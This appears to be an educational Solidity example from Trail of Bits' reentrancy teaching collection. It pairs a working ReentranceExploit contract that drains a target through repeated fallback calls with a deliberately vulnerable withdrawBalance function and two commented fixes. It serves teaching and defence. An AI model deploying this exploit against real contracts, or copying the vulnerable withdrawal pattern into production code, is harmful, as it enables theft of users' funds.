//These examples are developed and maintained by Trail of Bits. (trailofbits.com)
//https://github.com/trailofbits/not-so-smart-contracts

pragma solidity ^0.4.15;

contract ReentranceExploit {
    bool public attackModeIsOn=false; 
    address public vulnerable_contract;
    address public owner;
     event debug(string info);
     
    function ReentranceExploit() public{
        debug("Construct");
        owner = msg.sender;
    }

    function deposit(address _vulnerable_contract) public payable{
        debug("deposit");
        vulnerable_contract = _vulnerable_contract ;
        // call addToBalance with msg.value ethers
        require(vulnerable_contract.call.value(msg.value)(bytes4(sha3("addToBalance()"))));
    }

    function launch_attack() public{
        debug("launch");
        attackModeIsOn = true;
        // call withdrawBalance
        // withdrawBalance calls the fallback of ReentranceExploit
        require(vulnerable_contract.call(bytes4(sha3("withdrawBalance()"))));
    }  


    function () public payable{
        debug("fallback");
        // atackModeIsOn is used to execute the attack only once
        // otherwise there is a loop between withdrawBalance and the fallback function
        if (attackModeIsOn){
            attackModeIsOn = false;
                require(vulnerable_contract.call(bytes4(sha3("withdrawBalance()"))));
        }
    }

    function get_money(){
        suicide(owner);
    }

}

pragma solidity ^0.4.15;

contract Reentrance {
    event debug(string info);
    mapping (address => uint) userBalance;
   
    function getBalance(address u) constant returns(uint){
        
        return userBalance[u];
    }

    function addToBalance() payable{
        debug("addToBalance");
        userBalance[msg.sender] += msg.value;
    }   

    function withdrawBalance(){
         debug("withdrawBalance");
        // send userBalance[msg.sender] ethers to msg.sender
        // if mgs.sender is a contract, it will call its fallback function
        if( ! (msg.sender.call.value(userBalance[msg.sender])() ) ){
            throw;
        }
        userBalance[msg.sender] = 0;
    }   

    function withdrawBalance_fixed(){
                 debug("withdrawBalance_fixed");
        // to protect against re-entrancy, the state variable
        // has to be change before the call
        uint amount = userBalance[msg.sender];
        userBalance[msg.sender] = 0;
        if( ! (msg.sender.call.value(amount)() ) ){
            throw;
        }
    }   

    function withdrawBalance_fixed_2(){
                 debug("withdrawBalance_fixed_2");
        // send() and transfer() are safe against reentrancy
        // they do not transfer the remaining gas
        // and they give just enough gas to execute few instructions    
        // in the fallback function (no further call possible)
        msg.sender.transfer(userBalance[msg.sender]);
        userBalance[msg.sender] = 0;
    }   
   
}
